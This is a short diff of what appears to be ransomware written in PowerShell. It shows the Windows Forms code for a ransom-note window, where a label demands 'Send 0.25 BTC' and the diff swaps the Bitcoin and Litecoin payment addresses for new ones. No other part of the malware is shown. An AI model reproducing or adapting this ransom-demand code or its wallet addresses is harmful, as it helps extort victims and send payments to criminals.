@@ -89,7 +89,7 @@ $label2.Font = New-Object Drawing.Font("Arial", 10)
 $form.Controls.Add($label2)
 
 $label3 = New-Object Windows.Forms.Label
-$label3.Text = "Send 0.25 BTC to: bc1qmyrx6uf6hxcc0fns4gc8l3gjygm0l6kvw4n2au or ltc: ltc1qq92x9wr62t03zx5xljx6dmemqlswwgv83sve5q"
+$label3.Text = "Send 0.25 BTC to: bc1qwjgqnucwvtsmqs8gxdd28jmyvu7nyztrxqadsx or ltc: LXoSTzJuA5UymfRWgmAWvpNT96KFfTwGxv"
 $label3.AutoSize = $true
 $label3.Location = New-Object Drawing.Size(20, 90)
 $label3.Font = New-Object Drawing.Font("Arial", 10, [Drawing.FontStyle]::Bold)
